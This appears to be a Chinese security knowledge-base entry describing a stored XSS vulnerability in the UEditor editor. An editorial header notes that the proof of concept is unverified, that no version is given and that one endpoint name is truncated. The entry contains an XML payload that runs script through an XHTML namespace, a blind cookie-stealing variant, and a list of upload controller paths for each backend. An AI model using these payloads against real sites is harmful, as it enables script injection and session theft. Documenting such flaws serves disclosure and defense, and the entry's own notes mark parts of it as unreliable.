---
source: "白阁文库 BaizeSec/bylibrary"
product: "UEditor / 附件同源内容"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Ueditor 存储xss漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：未给版本；各语言后端配置可上传XML、文件可同源inline访问才成立"
side_effects: "未执行；本文需注意的操作影响：“直接文本框输入”与实际攻击载体混淆；主要路径为uploadfile上传XML，普通编辑区插入不同于上传附件解析；版本和响应安全策略缺失；XML可上传不自动等于同源脚本执行，须Content-Type/Disposition/CSP/域隔离证据；JSP动作名称截断；最后action=uploadimag少e"
source_status: "unknown"
id: "vw-1711e192e30add81910f75ea"
entity_id: "ve-1711e192e30add81910f75ea"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：未给版本；各语言后端配置可上传XML、文件可同源inline访问才成立

代码与实验材料：XML命名空间脚本及路径列表，缺上传请求、响应和浏览器/响应头

来源证据范围：白阁来源，无原始披露

- **结论使用边界（1）**：“直接文本框输入”与实际攻击载体混淆；依据：主要路径为uploadfile上传XML，普通编辑区插入不同于上传附件解析。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **事实待核（2）**：版本和响应安全策略缺失；依据：XML可上传不自动等于同源脚本执行，须Content-Type/Disposition/CSP/域隔离证据。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **代码与转录边界（3）**：JSP动作名称截断；依据：最后action=uploadimag少e。相应原代码作为存在此问题的历史样本保留，不能直接当作可运行、成功复现的 PoC；缺失内容需回原稿核对，不据此补造可执行攻击链。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Ueditor xss存储漏洞


直接文本框输入

漏洞POC:

```xml
<html>
<head></head>
<body>
<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
</body>
</html>


盲打Cookie、src=""：
<something:script src="" xmlns:something="http://www.w3.org/1999/xhtml"></something:script>
```

Ueditor 默认支持上传 xml ：config.json可以查看支持上传的后缀

/ueditor/asp/config.json
 /ueditor/net/config.json
 /ueditor/php/config.json
 /ueditor/jsp/config.json

上传文件路径

/ueditor/index.html

 /ueditor/asp/controller.asp?action=uploadimage
 /ueditor/asp/controller.asp?action=uploadfile

 /ueditor/net/controller.ashx?action=uploadimage
 /ueditor/net/controller.ashx?action=uploadfile

 /ueditor/php/controller.php?action=uploadfile
 /ueditor/php/controller.php?action=uploadimage

 /ueditor/jsp/controller.jsp?action=uploadfile
 /ueditor/jsp/controller.jsp?action=uploadimag


---

> 来源：白阁文库 BaizeSec/bylibrary
